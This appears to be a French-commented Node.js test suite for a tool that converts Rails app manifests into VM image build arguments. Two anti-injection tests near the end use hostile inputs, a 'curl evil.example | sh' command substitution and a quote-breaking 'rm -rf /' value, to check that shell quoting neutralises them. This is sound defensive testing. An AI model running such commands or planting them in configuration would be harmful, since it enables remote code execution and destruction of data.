import { after, test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  DEFAULT_RUBY_VERSION,
  RUBY_PATCH_LEVELS,
  analyzeApp,
  assetsPlan,
  buildArgs,
  defaultAppName,
  binaryAssetGems,
  extraPackages,
  formatAssignments,
  formatEnvFragment,
  resolveRubyVersion,
} from "../tools/build-v86-image/manifest-to-args.mjs";

// --- Fixtures partagées ------------------------------------------------------

const createdDirs = [];

/**
 * Crée une application factice dans un dossier temporaire.
 * @param {Record<string, string>} files chemins relatifs vers contenus
 * @returns {Promise<string>} racine du dossier créé
 */
async function createApp(files) {
  const dir = await mkdtemp(join(tmpdir(), "railsbox-build-"));
  createdDirs.push(dir);
  for (const [relativePath, content] of Object.entries(files)) {
    const target = join(dir, relativePath);
    await mkdir(dirname(target), { recursive: true });
    await writeFile(target, content, "utf8");
  }
  return dir;
}

after(async () => {
  for (const dir of createdDirs) {
    await rm(dir, { recursive: true, force: true });
  }
});

const SQLITE_LOCK = `GEM
  remote: https://rubygems.org/
  specs:
    nokogiri (1.16.0)
    propshaft (1.1.0)
    rails (8.1.3.1)
    sqlite3 (2.1.0)

BUNDLED WITH
   2.5.22
`;

// --- Résolution de la version de Ruby ---------------------------------------

test("resolveRubyVersion garde une version complète telle quelle", () => {
  // Arrange / Act
  const result = resolveRubyVersion("3.3.12");

  // Assert
  assert.equal(result.version, "3.3.12");
  assert.equal(result.resolved, false);
});

test("resolveRubyVersion complète une série connue par son dernier correctif", () => {
  // Arrange / Act
  const result = resolveRubyVersion("3.2");

  // Assert
  assert.equal(result.version, RUBY_PATCH_LEVELS["3.2"]);
  assert.equal(result.resolved, true);
});

test("resolveRubyVersion retombe sur la version par défaut sans version détectée", () => {
  // Arrange / Act
  const result = resolveRubyVersion(null);

  // Assert
  assert.equal(result.version, DEFAULT_RUBY_VERSION);
});

test("resolveRubyVersion refuse une série inconnue plutôt que de deviner", () => {
  // Arrange / Act / Assert
  assert.throws(() => resolveRubyVersion("2.7"), /railsbox\.yml/);
});

// --- Paquets système ---------------------------------------------------------

test("extraPackages joint les paquets de la base et ceux des gems natives", () => {
  // Arrange
  const manifest = {
    database: "postgresql",
    nativeGems: [{ name: "nokogiri", systemLibs: ["libxml2", "libxslt"] }],
    services: { redis: true },
  };

  // Act
  const packages = extraPackages(manifest);

  // Assert
  assert.deepEqual(packages, [
    "libpq-dev",
    "libxml2-dev",
    "libxslt1-dev",
    "postgresql",
    "postgresql-client",
    "redis-server",
  ]);
});

test("extraPackages n'installe ni PostgreSQL ni Redis pour une application sqlite3", () => {
  // Arrange
  const manifest = {
    database: "sqlite3",
    nativeGems: [{ name: "sqlite3", systemLibs: ["libsqlite3"] }],
    services: { redis: false },
  };

  // Act
  const packages = extraPackages(manifest);

  // Assert
  assert.deepEqual(packages, ["libsqlite3-dev"]);
});

// --- Pipeline d'assets -------------------------------------------------------

test("assetsPlan signale une précompilation rootfs pour une application importmap", () => {
  // Arrange
  const manifest = { assets: { npm: false, scripts: [] } };
  const specs = new Map([["propshaft", "1.1.0"]]);

  // Act
  const plan = assetsPlan(manifest, specs);

  // Assert
  assert.deepEqual(plan, { npm: false, scripts: [], precompile: true });
});

test("assetsPlan reprend les scripts npm détectés", () => {
  // Arrange
  const manifest = { assets: { npm: true, scripts: ["build:css", "build:js"] } };
  const specs = new Map([["sprockets-rails", "3.4.2"]]);

  // Act
  const plan = assetsPlan(manifest, specs);

  // Assert
  assert.equal(plan.npm, true);
  assert.deepEqual(plan.scripts, ["build:css", "build:js"]);
});

// --- Sérialisation shell -----------------------------------------------------

test("formatEnvFragment échappe les apostrophes des valeurs", () => {
  // Arrange
  const env = { APP_HOST: "l'hôte" };

  // Act
  const fragment = formatEnvFragment(env);

  // Assert
  assert.equal(fragment, "export APP_HOST='l'\\''hôte'\n");
});

test("formatEnvFragment rend une chaîne vide sans variable déclarée", () => {
  // Arrange / Act / Assert
  assert.equal(formatEnvFragment(undefined), "");
  assert.equal(formatEnvFragment({}), "");
});

test("formatAssignments produit des affectations shell entre apostrophes", () => {
  // Arrange
  const args = { APP_NAME: "demo", ASSET_SCRIPTS: "" };

  // Act
  const text = formatAssignments(args);

  // Assert
  assert.equal(text, "APP_NAME='demo'\nASSET_SCRIPTS=''");
});

test("defaultAppName normalise le dernier segment du chemin", () => {
  // Arrange / Act / Assert
  assert.equal(defaultAppName("tools/demo-app/Demo/"), "demo");
  assert.equal(defaultAppName("C:\\Projets\\Mon App"), "mon-app");
});

// --- Table des arguments -----------------------------------------------------

test("buildArgs décrit une application sqlite3 sans service ni npm", () => {
  // Arrange
  const manifest = {
    ruby: "3.3.12",
    database: "sqlite3",
    assets: { npm: false, scripts: [] },
    nativeGems: [{ name: "sqlite3", systemLibs: ["libsqlite3"] }],
    services: { redis: false, sidekiq: false },
  };

  // Act
  const args = buildArgs({
    manifest,
    specs: new Map([["propshaft", "1.1.0"]]),
    hasSeeds: true,
    appName: "demo",
  });

  // Assert
  assert.equal(args.WITH_POSTGRES, "0");
  assert.equal(args.WITH_REDIS, "0");
  assert.equal(args.NPM_ASSETS, "0");
  assert.equal(args.ASSET_PRECOMPILE, "1");
  assert.equal(args.RUBY_VERSION, "3.3.12");
  assert.equal(args.SEED_COMMAND, "bundle exec rails db:seed");
});

test("buildArgs laisse la commande de seed vide sans db/seeds.rb", () => {
  // Arrange
  const manifest = { ruby: "3.3.12", database: "sqlite3", services: {} };

  // Act
  const args = buildArgs({ manifest, specs: new Map(), hasSeeds: false, appName: "demo" });

  // Assert
  assert.equal(args.SEED_COMMAND, "");
});

test("buildArgs préfère la commande de seed déclarée dans railsbox.yml", () => {
  // Arrange
  const manifest = {
    ruby: "3.3.12",
    database: "sqlite3",
    services: {},
    seed: { command: "bin/rails demo:seed" },
  };

  // Act
  const args = buildArgs({ manifest, specs: new Map(), hasSeeds: true, appName: "demo" });

  // Assert
  assert.equal(args.SEED_COMMAND, "bin/rails demo:seed");
});

// --- Analyse complète d'une application --------------------------------------

test("analyzeApp produit des arguments exploitables pour une application importmap", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "ruby-3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
    "db/seeds.rb": "Post.create!(title: 'x')\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert
  assert.equal(analysis.args.APP_NAME, "demo");
  assert.equal(analysis.args.DATABASE, "sqlite3");
  assert.equal(analysis.args.NPM_ASSETS, "0");
  assert.equal(analysis.args.EXTRA_PACKAGES, "libsqlite3-dev libxml2-dev libxslt1-dev");
  assert.equal(analysis.args.SEED_COMMAND, "bundle exec rails db:seed");
});

test("analyzeApp refuse de produire des arguments sur un diagnostic bloquant", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\n',
    "config/database.yml": "production:\n  adapter: mysql2\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "cassee");

  // Assert
  assert.deepEqual(analysis.args, {});
  assert.match(analysis.report, /MySQL/);
});

test("analyzeApp applique les surcharges de railsbox.yml", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
    "railsbox.yml":
      "seed:\n  command: bin/rails db:seed_demo\nenv:\n  APP_HOST: http://localhost:8080\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert
  assert.equal(analysis.args.SEED_COMMAND, "bin/rails db:seed_demo");
  assert.equal(analysis.args.APP_ENV_MANIFEST, "export APP_HOST='http://localhost:8080'\n");
});

test("une valeur env de railsbox.yml portant $() reste inerte (anti-injection)", async () => {
  // Arrange : un railsbox.yml hostile tel qu'un dépôt tiers pourrait en fournir.
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "3.3.12\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
    "railsbox.yml": 'env:\n  APP_HOST: "$(curl evil.example | sh)"\n',
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert : la substitution de commande est enfermée dans des apostrophes,
  // donc traitée comme une chaîne littérale — jamais exécutée au build.
  assert.equal(analysis.args.APP_ENV_MANIFEST, "export APP_HOST='$(curl evil.example | sh)'\n");
});

test("une apostrophe dans une valeur env ne peut pas casser le quotage", () => {
  // Tentative d'évasion : fermer l'apostrophe pour injecter du shell.
  const fragment = formatEnvFragment({ X: "a'; rm -rf /; echo '" });
  // L'échappement POSIX bulletproof ('\'') neutralise la sortie de chaîne.
  assert.equal(fragment, "export X='a'\\''; rm -rf /; echo '\\'''\n");
});

test("analyzeApp transforme une série de Ruby inconnue en diagnostic bloquant", async () => {
  // Arrange
  const dir = await createApp({
    Gemfile: 'source "https://rubygems.org"\ngem "rails"\n',
    "Gemfile.lock": SQLITE_LOCK,
    ".ruby-version": "2.7\n",
    "config/database.yml": "production:\n  adapter: sqlite3\n",
  });

  // Act
  const analysis = await analyzeApp(dir, "demo");

  // Assert : rapport préservé, pas d'exception, aucun argument produit.
  assert.equal(analysis.args.RUBY_VERSION, undefined);
  assert.ok(
    analysis.findings.some(
      (f) => f.code === "unresolvable-ruby-series" && f.severity === "blocking",
    ),
  );
  assert.match(analysis.report, /2\.7/);
});

test("les gems d'assets à binaire précompilé sont détectées", () => {
  // tailwindcss-ruby et dartsass-ruby ne publient aucun binaire i386 (vérifié
  // sur rubygems) : sans détection, assets:precompile échouerait dans la VM
  // sur un exécutable illisible, dix minutes après le début du build.
  assert.deepEqual(binaryAssetGems(new Map([["propshaft", "1.0"]])), []);
  assert.deepEqual(binaryAssetGems(new Map([["tailwindcss-rails", "3.0"]])), ["tailwindcss-rails"]);
  assert.deepEqual(
    binaryAssetGems(
      new Map([
        ["dartsass-rails", "0.5"],
        ["tailwindcss-rails", "3.0"],
      ]),
    ),
    ["dartsass-rails", "tailwindcss-rails"],
  );
});
